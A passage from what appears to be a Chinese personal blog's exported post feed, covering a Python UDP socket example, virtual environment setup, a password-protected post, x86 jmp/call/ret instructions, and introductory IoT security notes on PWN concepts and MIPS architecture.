class="string">&#x27;info&#x27;</span> : <span class="string">f&#x27;<span class="subst">&#123;username&#125;</span> 的信息是:xxxxxxxx&#x27;</span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment"># 发送出去的信息必须是字节，所以要先序列化，再编码</span></span><br><span class="line">        sendbytes = json.dumps(message).encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        server_socket.sendto(sendbytes, client_addr)</span><br></pre></td></tr></table></figure>

<p>与TCP不同，服务端只需要一个 socket 进行通信即可，不需要2个 socket 分别用来监听和通信。</p>
<p>UDP 客户端的 socket 通常不需要指定绑定的端口号，操作系统会自动帮其选择一个绑定。</p>
<p>当不需要使用 UDP Socket 时，可以通过 socket 对象的 close 方法 关闭，如下代码所示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">server_socket.close()</span><br></pre></td></tr></table></figure>

<p>关闭 socket 后，该端口绑定的 端口号 就会被释放，可以再次被本进程或者其它进程的 socket 绑定使用</p>
<h4 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,json</span><br><span class="line"></span><br><span class="line">BUFF_LEN     = <span class="number">400</span>                   <span class="comment"># 最大报文长度</span></span><br><span class="line">SERVER_ADDR  = (<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">18000</span>)  <span class="comment"># 指明服务端地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 UDP Socket</span></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># 设置socket超时时间，单位：秒</span></span><br><span class="line">client_socket.settimeout(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要发送的信息 对象</span></span><br><span class="line">message = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span> : <span class="string">&#x27;获取信息&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;白月黑羽&#x27;</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment"># 发送出去的信息必须是字节，所以要先序列化，再编码</span></span><br><span class="line">sendbytes = json.dumps(message).encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">client_socket.sendto(sendbytes, SERVER_ADDR)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    recvbytes, server = client_socket.recvfrom(BUFF_LEN)</span><br><span class="line">    <span class="comment"># 接收到的信息是字节，所以要解码，再反序列化</span></span><br><span class="line">    message = json.loads(recvbytes.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"><span class="keyword">except</span> socket.timeout:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;接收消息超时&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://zhuanlan.zhihu.com/p/39982451">Python 的 Socket 编程教程 - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.liujiangblog.com/course/python/76">https://www.liujiangblog.com/course/python/76</a></li>
<li><a href="https://www.byhy.net/tut/py/etc/socket/">https://www.byhy.net/tut/py/etc/socket/</a></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python新建虚拟环境</title>
    <url>/2021/11/14/python/python%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="Python安装虚拟环境"><a href="#Python安装虚拟环境" class="headerlink" title="Python安装虚拟环境"></a>Python安装虚拟环境</h1><p>1.安装virtualenv包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install virtualenv  </span><br><span class="line">version==<span class="number">20.0</span><span class="number">.31</span></span><br></pre></td></tr></table></figure>

<p>2.创建放置虚拟环境的文件夹Python_virtual_environment</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/leWgfk1tcXHyvbr.png" alt="image-20211114164151926.png"></p>
<p>3.创建虚拟环境</p>
<p>进入到上面的文件夹下，进入cmd命令框执行以下命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m virtualenv “项目名”</span><br><span class="line"><span class="comment">#例如</span></span><br><span class="line">python -m virtualenv demo</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/14/Jb8Ql5D4X3ywndu.png" alt="image-20211114164255605.png"></p>
<p>4.激活虚拟环境</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt;&gt;<span class="built_in">cd</span> demo/Scripts</span><br><span class="line"></span><br><span class="line">&gt;&gt;activate</span><br></pre></td></tr></table></figure>

<p>5.退出虚拟环境</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt;&gt;deactivate.bat</span><br></pre></td></tr></table></figure>

<h2 id="pip临时源"><a href="#pip临时源" class="headerlink" title="pip临时源"></a>pip临时源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple “包的名称”</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>新的开始</title>
    <url>/2021/07/02/%E6%8E%A8%E5%85%8D/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码好像不对哦~~~" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="eca77e84b2669b5c2109020f0b0b3aa3b0a87b92b637384109d605b491242282">01578f387e3c30151972760a57cde301dfd92338488d946a77e6c7dd50650810cdcc91f3e5b5b76b011b41c1829a79e7ae233f607e32f4c607642961f8cc38c89c965202dcdf93866e0749ce940153944e4837598a0f041c9b8191f1b2b5386245907dcfa7c899cdf09644cac79ad21a65f79d57af4e3feb1009c22815215986ec9554f9a3e79477ee6d45a2e9dc89cbbad4e237a73974a4ba84c96eebffe30bedf987e5028702e44c8dcd354d80965fa14942104dc28ef12723d23b1c4155fbad4666a0ab53dc760ac3d0cca7b405cf3a3820c1495f67a5897d882ef2d265dfec44c637b4f612d72f3e0e565bf5f80349a8ca128e33ec0589e6f7360efbf398cd44f9a681ed1e78f0c8f4640334c8b59ce2d8dbbfe0f541140699900fac6cce82ab827e4819fa2b46980624025f3c52ecaf82fa11f659f1cc06dcb6d62704e1c73108e33e1a837aeb7652bc9c767d28b452b7fc9ab2351afa3e3cbaa940d8e733bec6daf687b0ebd303cce035ed016c4038a00d06c7d17d6277aa1ef463fa281dcaecda24ee275c7ec7d00564a56238dde24ee2b38da538e6e55c4858c87b46069e2e13d84d44b657387e0ee87147cd50405f231217af2c7b32f6877cf35618c09f19e799c91a9e97c48417f46eadcb4921e884476572b464df71ea17552f3981b640a7956e79f50efe4c713dc0814f432628304063a575ec20a9dc60704e30501ce33f6e7abb4a9482a491205c71f829e29090a604c68e7b27de32013cde05d65fe1ad936c8bc3e6ad3b7460a9f25c414d40de8a9a98003a964ab2bc4fb52a07391a43e747fb346fcb37a5dea97de93c8250ceb2a3183848b77dc1d0607abd95faa0fd92a4ea6e2a37a3ee099f65486effe206758e7e0b34268a33e11384e379383282691fe836b987e4c52349231891dc965732b766cc29c00004e8a62ee60170a58d88b95e91195a83c7516b75ad4d78f2c00f8b334ca3df04385d89fc5e4e01996972c7184d23102ef9b03123d59e844a2293e248b2363b20c0b8b92d14041ffb642fc4d6fd3493cbab4fef2c2b775c8e0906f8468d3140dfc7180d6892f7cd72f45d4e722a714bea8ac1874bcdc8c242b77d20a12085abc0f3914df96013dfb303c6d8014029471c956e8c635ad75f251c6c550b2e99fa83335c0369fb6afd824657002c991dea55fd4e69fc6c3377eb3a00754a65f48f8d41ec764755398e3d783d0406369e3f40ec9f8042df882d1fea2b8313e7ea26c90a71d6cbcc63d40dbfda108e121b33d4051164dcb301e2c98f7a1de732b01dc76ee0f3815dd18d2c66ca422267e4546d83cebad9c6e533ae7305feb9983315af2a8e8a1dd244fb8be4c2fe005db93cc62ac927936fc173f07c2d72d9270591d9879719a6f09bebe82db5b615f8c528eac611379f57aca61532bb83c079f5f6337120c37f3041c1bf8480c9c4f69af6c482319fe199d2a11206fa269be2f5c49dfcc367192140ed93694169db2b3b7dcda3b479ce3933a4bea4c7cc954a701afec210fedea73bf71145d71f2fa6e1bd658c1815ffa4d3f83e2c4ac0fc42f9a4163bca7b20501af0ec3b97eadea89b546e9de970c8ba161959836efb2a7a74864273e76ef2f86551689157533fd660a7e2fd0cf4bb3bbff861aaf9d7332d85295330ba0e9e4ea53b6ed47377ceeca49f6961d7e5c91f2952b814b736ab98a894114e0eea60a44e24ce7e642593484d240a49813394c02c950ca665596803f0dd8171ac871de5889779b076fe778bca9dcef7055d931400dbc298c35f4ce0f8cf41e48e64193affafb8c74420f6ca8b12a1b9f5093cbcdc730ec72795695adbe3bfaafc85556c525618a902e939601d7a30c501e994aeda040638f1ea532abb325dc833b26c0ecde750076e2af3065b82a61d0a783e83967f96afb0e4cb0abc6c005164737a799313a1a2d172fb250ac14cb3d04d5227e90621ed9afd454cf7f3c6ab5d656b0c9dac94e1e4429edb0feec8ec4097e7fed556cb391301c63d72d7f6795c96af4384ad9493f91945d87c37c6ec851a037108cda370b98cb4b853c31c24d763b55b22943a98718a903ffcc35bb4188148c80ef87fbff391d4ca0c0c3336e98eddbd0fdbcf0030b6e68cb8cdcb647d6f69ccc7027674720081f5261f59dd7b4121109c77432b83006f5fdbab7adf719ab5b6872a07a45be706dcfa2b1810ac61aa8b79d27fda4ba40072794a06c29ce3e1a38c770752ec31f7a952600ae1bab28562925c4577edc9adca54ae074ccfdf3fc5d91536edc5afc9fa2b40983fc7df7e9f9c84276cf713c10105324f03e16b40ff948bcfddb14534aee35f60be6a3c594e3ad75ce4d8532bc314e2a76bf995b1d9cf81d10680eabfd6780c9fc05b9ad3ac5a341ab5861c86e889a4dc9d9dd388c6a780f719e62e9ade4029a06c606fff20792c2ccdc1bd7640c8efdca91210bb46e37bf934144811617db3303b8a2600b878deaab3e3d1dcfd0a577c99aeb1ce18be11d90983fe91944e81ea5f9bc799640f63af5fa1e704b9b5a162450f91d1b176a75d6fd90be9d6cacc636119e34eeb7575c2b02b16d3001cf8e3a67a6025373c70880080b94d9eb2da4b4782d9d515b72e9ecae36206f5cf20c72a3ce9760f1ef84635eadb5940a44899a27c9687d803cd93ed48be14349ba25d69301f6b1fe5b0e046df224aa3ab17d0082e93786349adff0718f0ec2c977e5eaa1d43245b</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-flip">
      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="Please input password: ">Please input password: </span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>推免</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>jmp、call和ret指令</title>
    <url>/2021/11/19/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/jmp%E3%80%81call%E5%92%8Cret%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h1><p><strong>jmp指令为无条件转移指令，可以只修改IP，也可以同时修改CS和IP</strong></p>
<p>jmp指令的主要应用格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">只改变IP————段内转移</span><br><span class="line">jmp short 标号（转到标号处执行指令）——短转移，8位位移</span><br><span class="line">jmp near ptr 标号   ——近转移，16位位移</span><br><span class="line">jmp 16位reg</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同时改变CS和IP————段间转移</span><br><span class="line">jmp far ptr 标号    ——远转移</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>



<h1 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h1><p>CPU执行call指令时，进行两步操作：</p>
<ol>
<li>将当前的IP或CS和IP压入栈中；</li>
<li>转移。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">只改变IP————段内转移</span><br><span class="line"></span><br><span class="line">call 标号(将当前的IP压入栈后，转到标号处执行指令)</span><br><span class="line">相当于操作：</span><br><span class="line">	push IP</span><br><span class="line">	jmp near ptr 标号</span><br><span class="line">     </span><br><span class="line">call 16位reg</span><br><span class="line">相当于操作：</span><br><span class="line">	push IP</span><br><span class="line">	jmp 16位reg</span><br><span class="line"></span><br><span class="line">call word ptr 内存地址单元</span><br><span class="line">相当于操作：</span><br><span class="line">	push IP</span><br><span class="line">	jmp word ptr 内存地址单元</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同时改变CS和IP————段间转移</span><br><span class="line"></span><br><span class="line">call far ptr 标号     </span><br><span class="line">相当于操作：</span><br><span class="line">	push CS</span><br><span class="line">	push IP</span><br><span class="line">	jmp far ptr 标号</span><br><span class="line">    </span><br><span class="line">call dword ptr 内存单元地址</span><br><span class="line">相当于操作：</span><br><span class="line">	push CS</span><br><span class="line">	push IP</span><br><span class="line">	jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>



<h1 id="ret指令"><a href="#ret指令" class="headerlink" title="ret指令"></a>ret指令</h1><p>ret指令调用栈中的数据，修改IP的内容，从而实现近转移；</p>
<p>retf指令调用栈中的数据，修改CS和IP的内容，从而实现远转移。</p>
<p><strong>ret指令</strong></p>
<p>相当于操作：pop IP</p>
<p><strong>retf指令</strong></p>
<p>相当于操作：pop IP	   pop CS</p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
  </entry>
  <entry>
    <title>IoT安全入门00</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A800/</url>
    <content><![CDATA[<h1 id="物联网安全入门"><a href="#物联网安全入门" class="headerlink" title="物联网安全入门"></a>物联网安全入门</h1><p>研一入学时学习了看雪上的课程《物联网安全入门》，大半年过去了已经忘的差不多了，去年已经边看边学也记了一些零碎的笔记，最近花了一周时间把以前的笔记给尽量完善一下，也算是进行一下系统的复习。</p>
<p>此系列参考自《物联网安全入门》，这门课个人感觉更像是一个扫盲课（毕竟是入门课程），让你对物联网（安全）的整体有一个大致了解，但具体到某一部分，还是不够详细，还需要在查阅其他资料来补相关的知识。</p>
<p>笔记根据课程目录，大致分为8个章节：</p>
<p>第一章：逆向基础</p>
<p>第二章：PWN基础</p>
<p>第三章：物联网硬件层安全讲解</p>
<p>第四章：物联网固件层安全讲解</p>
<p>第五章：物联网嵌入式Web</p>
<p>第六章：物联网架构之物联网协议</p>
<p>第七章：物联网渗透测试之移动应用</p>
<p>第八章：物联网安全防护</p>
]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
  </entry>
  <entry>
    <title>IoT安全入门02</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A802/</url>
    <content><![CDATA[<h1 id="第二章-PWN基础"><a href="#第二章-PWN基础" class="headerlink" title="第二章 PWN基础"></a>第二章 PWN基础</h1><h2 id="0x01-PWN入门介绍-PWN环境搭建"><a href="#0x01-PWN入门介绍-PWN环境搭建" class="headerlink" title="0x01 PWN入门介绍&amp;&amp;PWN环境搭建"></a>0x01 PWN入门介绍&amp;&amp;PWN环境搭建</h2><h3 id="1-PWN"><a href="#1-PWN" class="headerlink" title="1. PWN"></a>1. PWN</h3><h4 id="1-1-PWN？"><a href="#1-1-PWN？" class="headerlink" title="1.1 PWN？"></a>1.1 PWN？</h4><p>Pwn，是一个骇客语法的俚语词，自”own”这个词引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的情况下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817204347866.png" alt="image-20220817204347866"></p>
<span id="more"></span>

<h4 id="1-2-Pwn"><a href="#1-2-Pwn" class="headerlink" title="1.2 Pwn"></a>1.2 Pwn</h4><p>Pwn一般指二进制上的漏洞。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817204604805.png" alt="image-20220817204604805"></p>
<h3 id="2-常见PWN漏洞"><a href="#2-常见PWN漏洞" class="headerlink" title="2. 常见PWN漏洞"></a>2. 常见PWN漏洞</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817204842613.png" alt="image-20220817204842613"></p>
<h3 id="3-PWN基础讲解"><a href="#3-PWN基础讲解" class="headerlink" title="3. PWN基础讲解"></a>3. PWN基础讲解</h3><h4 id="3-1-Linux内存布局"><a href="#3-1-Linux内存布局" class="headerlink" title="3.1 Linux内存布局"></a>3.1 Linux内存布局</h4><p>X86布局：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817205505774.png" alt="image-20220817205505774"></p>
<p>Kernel space内核空间：管理内存，外设，进程等。</p>
<p>Stack 栈空间：</p>
<p>Memory Mapping Segment：内存映射</p>
<h4 id="3-2-经典栈溢出"><a href="#3-2-经典栈溢出" class="headerlink" title="3.2 经典栈溢出"></a>3.2 经典栈溢出</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817210022940.png" alt="image-20220817210022940"></p>
<h4 id="3-3-ROP"><a href="#3-3-ROP" class="headerlink" title="3.3 ROP"></a>3.3 ROP</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817212241011.png" alt="image-20220817212241011"></p>
<h3 id="4-PWN环境搭建"><a href="#4-PWN环境搭建" class="headerlink" title="4. PWN环境搭建"></a>4. PWN环境搭建</h3><h4 id="4-1-Pwn环境搭建"><a href="#4-1-Pwn环境搭建" class="headerlink" title="4.1 Pwn环境搭建"></a>4.1 Pwn环境搭建</h4><p><strong>！！！Note：</strong>16.04版本的Ubuntu按照下面的指令安装pwndbg时大概率会报错，因为Ubuntu16.04的版本现在已经有点低了，建议换高版本的Ubuntu，如果实在想用16.04的话，建议找一个别人装好的虚拟机，自己折腾真的太费时间了。我用的是giantbranch师傅装好的虚拟机，仓库地址如下：<a href="https://github.com/giantbranch/pwn-env-init">https://github.com/giantbranch/pwn-env-init</a></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817213711297.png" alt="image-20220817213711297"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817214307340.png" alt="image-20220817214307340"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220817214911061.png" alt="image-20220817214911061"></p>
<p>我是打算重新整理一个环境搭建的笔记，忙完这段时间再说，先挖个坑。</p>
<h2 id="0x02-PWN常见工具详解"><a href="#0x02-PWN常见工具详解" class="headerlink" title="0x02 PWN常见工具详解"></a>0x02 PWN常见工具详解</h2><p>PS：这部分跟我在看雪学习PWN入门的课程感觉有些重复了，本来没想写这一张，但是强迫症，还是按照课程目录给写上了，无视就好，hhh</p>
<h3 id="1-GDB"><a href="#1-GDB" class="headerlink" title="1. GDB"></a>1. GDB</h3><p>参考看雪pwn入门</p>
<h3 id="2-pwntools"><a href="#2-pwntools" class="headerlink" title="2. pwntools"></a>2. pwntools</h3><p>参考看学pwn入门和其他的一些博客</p>
<h2 id="0x03-MIPS堆栈溢出"><a href="#0x03-MIPS堆栈溢出" class="headerlink" title="0x03 MIPS堆栈溢出"></a>0x03 MIPS堆栈溢出</h2><p>参考ctfwiki pwn的MIPS部分</p>
<h2 id="0x04-ARM堆栈溢出"><a href="#0x04-ARM堆栈溢出" class="headerlink" title="0x04 ARM堆栈溢出"></a>0x04 ARM堆栈溢出</h2><p>参考ctfwiki pwn的ARM部分</p>
]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全入门01</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A801/</url>
    <content><![CDATA[<h1 id="第一章-逆向基础"><a href="#第一章-逆向基础" class="headerlink" title="第一章 逆向基础"></a>第一章 逆向基础</h1><h2 id="0x01-MIPS基础"><a href="#0x01-MIPS基础" class="headerlink" title="0x01 MIPS基础"></a>0x01 MIPS基础</h2><h3 id="1-什么是MIPS？"><a href="#1-什么是MIPS？" class="headerlink" title="1. 什么是MIPS？"></a>1. 什么是MIPS？</h3><h4 id="1-1-什么是MIPS？"><a href="#1-1-什么是MIPS？" class="headerlink" title="1.1 什么是MIPS？"></a>1.1 什么是MIPS？</h4><p><strong>MIPS</strong>（无互锁流水线微处理器）是一种<strong>精简（RISC）</strong>指令集体系结构（ISA），起源于Stanford大学John Hennessy教授的研究成果。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220802105706727.png" alt="image-20220802105706727"></p>
<p><strong>MIPS</strong>版本不同，支持的指令集不同，操作的位数也不同。<strong>MIPS</strong>可扩展项，可根据不同的需求进行扩充。</p>
<span id="more"></span>

<h4 id="1-2-CISC-RISC"><a href="#1-2-CISC-RISC" class="headerlink" title="1.2 CISC&amp;RISC"></a>1.2 CISC&amp;RISC</h4><ul>
<li><strong>CISC</strong>（Complex Instruction Set Computer）复杂指令计算机。Inter的X86，AMD的K5，K6为该类型。</li>
<li><strong>RISC</strong>（Reduced Instruction Set Computer）精简指令计算机。Acorn公司的ARM，IBM公司的PowerPC，MIPS公司的MIPS为该类型。</li>
</ul>
<h4 id="1-3-RISC和CISC架构"><a href="#1-3-RISC和CISC架构" class="headerlink" title="1.3 RISC和CISC架构"></a>1.3 RISC和CISC架构</h4><p><strong>RISC(Reduced Instruction Set Computer):</strong></p>
<ol>
<li>Less instruction and addressing modes.</li>
<li>Only register-register operation.</li>
<li>Load and Store instructions.</li>
<li>High speed.</li>
<li>Control signals are generate by external hardware circuit.</li>
<li>Instruction is executed in one clock.</li>
</ol>
<p><strong>CISC(Complex Instruction Set Computer):</strong></p>
<ol>
<li>More instuctions and addressing modes.</li>
<li>Register to Register&#x2F; Memeory&#x2F; I&#x2F;O.</li>
<li>Load， Store and other instructions.</li>
<li>Low speed.</li>
<li>Control signals are generated by internal hardware circuit.</li>
</ol>
<h4 id="1-4-MIPS结构的基本特点"><a href="#1-4-MIPS结构的基本特点" class="headerlink" title="1.4 MIPS结构的基本特点"></a>1.4 MIPS结构的基本特点</h4><ol>
<li>所有指令都是32位编码。</li>
<li>有些指令有32位供目标地址编码；有些则只有16位。因此想要加载任何一个32位值，就得用两个加载指令。16位的目标地址意味着，指令的跳转或子函数的位置必须在64K以内（上下32K）。</li>
<li>所有的动作原理上要求<strong>必须在1个时钟周期内完成，一个动作一个阶段</strong>。</li>
<li><strong>有32个通用寄存器，每个寄存器32位（32位机器）或64位（64位机器）</strong>。</li>
<li>本身没有任何帮助运算判断的标志寄存器，要实现相应的功能时，是通过测试两个寄存器是否相等来完成的。</li>
<li>所有运算都是基于32位的，没有对字节和对半字的运算（MIPS里，字定义为32位，半字定义为16位）。</li>
<li>没有单独的栈指令，所有对栈的操作都是统一的内存访问方式。</li>
<li>由于<strong>MIPS固定指令长度</strong>，所以造成其编译后的二进制文件和内存占用空间比X86大。</li>
<li>寻址方式：只有一种内存寻址方式。就是一个基地址加一个16位的偏移地址。</li>
<li>内存中的数据访问必须严格对齐（至少4字节对齐）。</li>
<li>跳转指令只有26位目标地址，再加上2位的对齐位，可寻址28位的空间，即256M。</li>
<li>条件分支指令只有16位跳转地址，加上2位的对齐位，供18位寻址方式，即256K。</li>
<li>MIPS默认不把子函数的返回地址（就是调用函数的受害指令地址）存放到栈中，而是存放在$31寄存器中。</li>
<li><strong>流水线效应</strong>。由于采取了高度的流水线，结果产生了一些对程序员来说可见的效应，需要注意。最需要注意的两个效应就是<strong>分支延迟效应</strong>和<strong>载入延迟效应</strong>。</li>
</ol>
<h4 id="1-5-MIPS的大小端：MIPS，MIPSEL"><a href="#1-5-MIPS的大小端：MIPS，MIPSEL" class="headerlink" title="1.5 MIPS的大小端：MIPS，MIPSEL"></a>1.5 MIPS的大小端：MIPS，MIPSEL</h4><p>eg：假如有一个4字节的数据为0x12 34 56 78（十进制：305419896，0x12为高字节，0x78为低字节），若将其存放于地址0x4000 8000中</p>
<table>
<thead>
<tr>
<th>内存地址</th>
<th>0x4000 8000（低地址）</th>
<th>0x4000 8001</th>
<th>0x4000 8002</th>
<th>0x4000 8003（高地址）</th>
</tr>
</thead>
<tbody><tr>
<td>大端模式</td>
<td>0x12（高地址）</td>
<td>0x34</td>
<td>0x56</td>
<td>0x78（低地址）</td>
</tr>
<tr>
<td>小端模式</td>
<td>0x78（低地址）</td>
<td>0x56</td>
<td>0x34</td>
<td>0x12（高地址）</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>MIPS</strong>	 ：big-endian的MIPS架构</p>
<p><strong>MIPSEL</strong> ：little-endian的MIPS架构</p>
</blockquote>
<h3 id="2-MIPS应用领域"><a href="#2-MIPS应用领域" class="headerlink" title="2. MIPS应用领域"></a>2. MIPS应用领域</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220802112837180.png" alt="image-20220802112837180"></p>
<h3 id="3-MIPS寄存器"><a href="#3-MIPS寄存器" class="headerlink" title="3. MIPS寄存器"></a>3. MIPS寄存器</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202011101428_A5P3QAYCWAK2GZJ.png" alt="register"></p>
<p>在一般情况下，32位寄存器中每个寄存器的大小是32位，即4字节。</p>
<h3 id="4-MIPS流水线"><a href="#4-MIPS流水线" class="headerlink" title="4. MIPS流水线"></a>4. MIPS流水线</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220802113150952.png" alt="image-20220802113150952"></p>
<ol>
<li><strong>取指令</strong>：将指令从指令Cache中取出，并计算下一条指令的地址</li>
<li><strong>读操作数及转移</strong>：根据指令从寄存器中读出操作数，同时若为转移类指令，满足转移条件时设置PC</li>
<li><strong>执行</strong>：根据指令进行计算，若为存取类指令，则计算地址</li>
<li><strong>访问存储器</strong>：若为存取类指令，对进行数据Cache进行读写</li>
<li><strong>写结果</strong>：将执行或存取的结果写过寄存器</li>
</ol>
<h2 id="0x02-MIPS汇编"><a href="#0x02-MIPS汇编" class="headerlink" title="0x02 MIPS汇编"></a>0x02 MIPS汇编</h2><h3 id="1-MIPS寻址方式"><a href="#1-MIPS寻址方式" class="headerlink" title="1. MIPS寻址方式"></a>1. MIPS寻址方式</h3><ul>
<li><p>立即数寻址：操作数是位于指令自身中的常数</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220810215841320.png" alt="image-20220810215841320"></p>
<p>OP表示指令的类型；RS、RT表示涉及到的寄存器；立即数</p>
</li>
<li><p>寄存器寻址：操作数是寄存器</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220810215955900.png" alt="image-20220810215955900"></p>
</li>
<li><p>基址寻址或偏移寻址：操作数在内存中，其地址是指令中基址寄存器和常数的和，如lw和sw指令</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220810220100812.png" alt="image-20220810220100812"></p>
</li>
<li><p>PC相对寻址：地址是PC和指令中常数的和</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220810220217048.png" alt="image-20220810220217048"></p>
</li>
<li><p>伪直接寻址：跳转地址由指令中的26位字段和PC高位相连而成</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220810220317897.png" alt="image-20220810220317897"></p>
</li>
</ul>
<h3 id="2-MIPS指令格式"><a href="#2-MIPS指令格式" class="headerlink" title="2. MIPS指令格式"></a>2. MIPS指令格式</h3><p><strong>R格式指令</strong>为纯寄存器指令，所有的操作数（除移位外）均保存在寄存器中。Op字段均为0，使用funct字段区分指令</p>
<p><strong>I格式指令</strong>为带立即数指令，最多使用两个寄存器，同时包括了load&#x2F;store指令使用Op字段区分指令</p>
<p><strong>J格式指令</strong>为长跳转指令，仅有一个立即数操作数。使用Op字段区分指令</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220810220724164.png" alt="image-20220810220724164"></p>
